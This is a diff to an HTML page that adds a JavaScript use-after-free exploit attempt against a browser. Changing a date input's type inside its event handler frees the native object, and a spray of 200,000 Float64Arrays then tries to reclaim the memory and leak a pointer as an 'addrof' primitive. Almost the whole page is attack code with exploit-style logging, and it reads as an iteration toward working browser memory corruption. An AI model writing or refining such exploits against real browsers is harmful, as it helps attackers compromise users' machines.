@@ -1,9 +1,86 @@
 <!DOCTYPE html>
 <html>
+<head>
+<style>
+body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
+</style>
+</head>
 <body>
-<div id="r"></div>
+<div id="log"></div>
+
+<!-- The victim element -->
+<input type="date" id="target">
+
 <script>
-document.getElementById("r").textContent = localStorage.getItem('prop_test') || 'EMPTY';
+function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
+
+log("=== UAF TO ADDROF PRIMITIVE (V2: MAXIMUM OVERDRIVE) ===", "info");
+log("[*] Grooming the heap with massive pressure...", "info");
+
+let targetObjects = [];
+let spray = [];
+
+// Prepare the victims
+for (let i = 0; i < 5000; i++) {
+    targetObjects.push({ magic: 0x1337, victim: true, id: i });
+}
+
+// Force some GC pressure before we start to clean up fragmented chunks
+for (let i = 0; i < 20000; i++) {
+    new String("GARBAGE_" + i);
+}
+
+let input = document.getElementById("target");
+
+input.addEventListener("input", () => {
+    log("[!] INPUT CAUGHT! Freeing the C++ object...", "warn");
+    input.type = "text"; // FREE!
+    
+    log("[*] Object freed! RECLAIMING MEMORY WITH EXTREME PREJUDICE!", "hit");
+    
+    // WE DIDN'T SPRAY HARD ENOUGH LAST TIME! 
+    // WE INCREASE THE SPRAY TO 200,000 ALLOCATIONS!
+    // WE WILL BURY THE HEAP IN FLOAT64ARRAYS!
+    for (let i = 0; i < 200000; i++) {
+        let fakeObj = new Float64Array(32); 
+        fakeObj[0] = 1.1; // Safe padding
+        fakeObj[1] = 2.2; // Safe padding
+        fakeObj[2] = 3.3; // Fake pointer target
+        spray.push(fakeObj);
+    }
+    
+    log("[!] Reclaim complete. 200,000 chunks allocated.", "warn");
+});
+
+setTimeout(() => {
+    log("[*] Triggering UAF...", "info");
+    try {
+        input.focus();
+        input.stepUp(); // Fires the input event
+        
+        let leaked = false;
+        for (let i = 0; i < spray.length; i++) {
+            // Check if C++ overwrote our magic numbers with a pointer!
+            if (spray[i][0] !== 1.1 || spray[i][1] !== 2.2 || spray[i][2] !== 3.3) {
+                log(">>> POINTER LEAKED! <<<", "hit");
+                log("Corrupted chunk found at spray index: " + i, "hit");
+                log("Raw Memory [0]: " + spray[i][0], "hit");
+                log("Raw Memory [1]: " + spray[i][1], "hit");
+                log("Raw Memory [2]: " + spray[i][2], "hit");
+                leaked = true;
+                break;
+            }
+        }
+        
+        if (!leaked) {
+            log("[-] Still no leak. We might need to spray JSObjects instead of Float64Arrays to match the allocator bucket.", "warn");
+        }
+        
+    } catch(e) {
+        log("[-] Error: " + e.message, "info");
+    }
+}, 1000);
 </script>
 </body>
 </html>
